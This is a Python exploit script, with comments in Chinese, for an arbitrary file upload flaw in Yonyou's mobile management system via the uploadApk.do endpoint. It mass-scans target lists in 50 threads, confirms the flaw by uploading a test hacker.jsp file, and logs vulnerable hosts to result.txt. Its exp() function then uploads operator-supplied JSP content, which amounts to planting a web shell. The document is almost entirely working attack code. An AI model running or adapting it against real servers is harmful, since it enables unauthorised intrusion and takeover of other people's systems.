# 用友 移动管理系统 uploadApk.do 任意文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                             author:watermelon_xz🍉
                                  version:用友 移动管理系统 uploadApk.do 任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友 移动管理系统 uploadApk.do 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/maportal/appmanager/uploadApk.dopk_obj='
    url = target+payload
    headers = {
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Cookie':'JSESSIONID=C4E4D0BD20C3CC266B9091E656594B45.server; JSESSIONID=651D328AF33591493FB628C0A1E3BF06.server',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
        'Content-Length':'228',  
         }
    data = (
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n'
        'Content-Disposition: form-data; name="downloadpath"; filename="hacker.jsp"\r\n'
        'Content-Type: application/msword\r\n'
        '\r\n'
        'This page has a vulnerability\r\n'
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--'
    )
   

    payload1='/maupload/apk/hacker.jsp'
    url1=target+payload1
    headers1 = {
    'Pragma':'no-cache',
    'Cache-Control':'no-cache',
    'Upgrade-Insecure-Requests':'1',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding':'gzip, deflate',
    'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Cookie':'JSESSIONID=D5B7B7FE546C5575A59C14E6D446C1C3.server',
    'Connection':'close',
            }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False)
        # print(re.text)
        if re.status_code == 200 and '"status":2' in re.text:
            # print("200啦")
            # print(f'[+++]该{target}存在用友 移动管理系统 uploadApk.do 任意文件上传漏洞')
            re1= requests.get(url=url1,headers=headers1)
            if 'This page has a vulnerability' in re1.text:
                print(f'[+++]{target}存在任意文件上传漏洞,文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True
        else:
            print(f'该{target}不存在该漏洞')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False

#定义exp
def exp(target):
    print("++++++++++++++++++++正在漏洞利用++++++++++++++++++++")
    time.sleep(3)
    cont = input("请输入要上传的文件内容:")
    fname = input("请输入要上传的文件名(后缀为.jsp):")
    payload = '/maportal/appmanager/uploadApk.dopk_obj=' 
    url = target+payload
    headers = {
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Cookie':'JSESSIONID=C4E4D0BD20C3CC266B9091E656594B45.server; JSESSIONID=651D328AF33591493FB628C0A1E3BF06.server',
        'Connection':'close',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
        'Content-Length':'228',  
         }
    data = (
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n'
        f'Content-Disposition: form-data; name="downloadpath"; filename="{fname}"\r\n'
        'Content-Type: application/msword\r\n'
        '\r\n'
        f'{cont}\r\n'
        '------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--'
    )
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    payload1=f'/maupload/apk/{fname}'
    url1=target+payload1
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False)
        # print(re.text)
        if re.status_code == 200 and '"status":2' in re.text:
          print(f'[+++]{target}存在任意文件上传漏洞,文件上传后地址为{url1}')
        else:
            print('上传失败请手动测试')
            return False
    except:
        print(f'该{target}存在问题，请手动测试')
        return False


if __name__ == '__main__':
    main()